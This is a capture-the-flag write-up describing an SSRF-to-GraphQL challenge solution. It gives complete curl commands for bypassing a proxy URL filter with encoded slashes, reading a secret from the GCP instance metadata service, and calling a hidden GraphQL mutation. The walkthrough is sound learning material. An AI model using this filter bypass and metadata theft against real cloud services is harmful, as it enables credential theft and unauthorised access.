# 🏳️ The Great Juche Jaguar GraphQL Heist

> A deep-dive into a chained SSRF + GraphQL exploitation challenge from the DoD Cyber Sentinel Skills Challenge for Summer 2025. This was a 300-point web exploitation flag that combined cloud metadata abuse, introspection tactics, and endpoint logic failures.

---

## 🧠 Challenge Summary

The Juche Jaguar team exposed a **GraphQL API** behind a misconfigured **proxy endpoint**. By abusing an SSRF vector to access **GCP metadata**, I extracted a secret header, used that to authenticate to the GraphQL service, performed **introspection**, and discovered a hidden **mutation** that returned the final flag.

This was not your typical GraphQL challenge, it chained together multiple real-world vulnerabilities across layers of cloud infrastructure and API logic.

---

## 🧪 Exploit Chain Overview

- ✅ SSRF through `/proxy?url=` to reach internal metadata
- ✅ Extraction of `X-JJ-SECRET` from GCP instance metadata
- ✅ Use of the secret to access the GraphQL endpoint
- ✅ Manual introspection to discover hidden mutation
- ✅ Base64 decoding of response to retrieve flag

---

## 🧾 Step-by-Step Breakdown

### 🕵️‍♀️ 1. Discovering the SSRF Vector

While exploring the application, I noticed that the `/proxy?url=` parameter accepted user-supplied input. Attempting a standard SSRF payload like:

```bash
curl "http://34.86.186.68:8080/proxy?url=http://169.254.169.254/"
```

...was blocked or sanitized. However, encoding the slashes (/) using %2F bypassed the filter:

```bash
curl "http://34.86.186.68:8080/proxy?url=http:%2F%2F169.254.169.254%2F"
```

This subtle bypass allowed full interaction with internal GCP services, including metadata enumeration.
--

### ✨ 2. SSRF to Access GCP Metadata

Used the vulnerable proxy endpoint to access the internal GCP metadata service:

```bash
curl "http://34.86.186.68:8080/proxy?url=http:%2F%2F169.254.169.254%2FcomputeMetadata%2Fv1/" \
  -H "Metadata-Flavor: Google"
```
This revealed the internal attribute: *X-JJ-SECRET*
--

### 🔑 3. Extracting the Secret Header

Then I pulled the value of that attribute directly:

```bash
curl "http://34.86.186.68:8080/proxy?url=http:%2F%2F169.254.169.254%2FcomputeMetadata%2Fv1%2Finstance%2Fattributes%2FX-JJ-SECRET" \
  -H "Metadata-Flavor: Google"
```
✅ Output: *S3NT1N3L*
--

### 🧩 4. GraphQL Introspection

Armed with the secret, I could now access the protected GraphQL endpoint:

```bash
curl http://34.86.186.68:8080/graphql \
  -H "Content-Type: application/json" \
  -H "X-JJ-SECRET: S3NT1N3L" \
  --data '{"query":"{ __schema { mutationType { fields { name } } } }"}'
```
This revealed a hidden mutation: *m309e5336*
--

### 🚨 5. Invoking the Mutation

I triggered the hidden mutation to retrieve the flag:

```bash
curl http://34.86.186.68:8080/graphql \
  -H "Content-Type: application/json" \
  -H "X-JJ-SECRET: S3NT1N3L" \
  --data '{"query":"mutation { m309e5336 }"}'
```
**Encoded response:**

`eyJkYXRhIjp7Im0zMDllNTMzNiI6IkMxe3NzdDFfcjNtMHQzX2MwZDNfeDNjfSJ9fQ==`

**Decoded output:**

```json
{
  "data": {
    "m309e5336": "C1{sst1_r3m0t3_c0d3_x3c}"
  }
}
```
--

### 🏁 Final Flag

`C1{sst1_r3m0t3_c0d3_x3c}`

---

### 🔍 Key Techniques & Learnings
SSRF via query parameter injection

Cloud metadata enumeration (GCP)

Header-based GraphQL authentication

Manual GraphQL introspection with introspection disabled by default

Response decoding and mutation analysis

---

### 🛠 Tools Used
curl for all HTTP interactions

base64 for decoding the response

Manual query crafting

Logical exploitation & metadata awareness

---

### 👩‍💻 About Me
**Brenda Hensley**

🧠 AppSec & OffSec focused

🛡 TryHackMe: Top 5%

🏆 Placed **247th out of ~2200** in the 2025 **DoD Cyber Sentinel Skills Challenge** with 15/23 challenges completed

🔗 [LinkedIn](https://www.linkedin.com/in/brenda-hensley-/) & [Portfolio](https://brendahensley.tech)

## ✨ Fork it. Learn from it. Break things ethically.
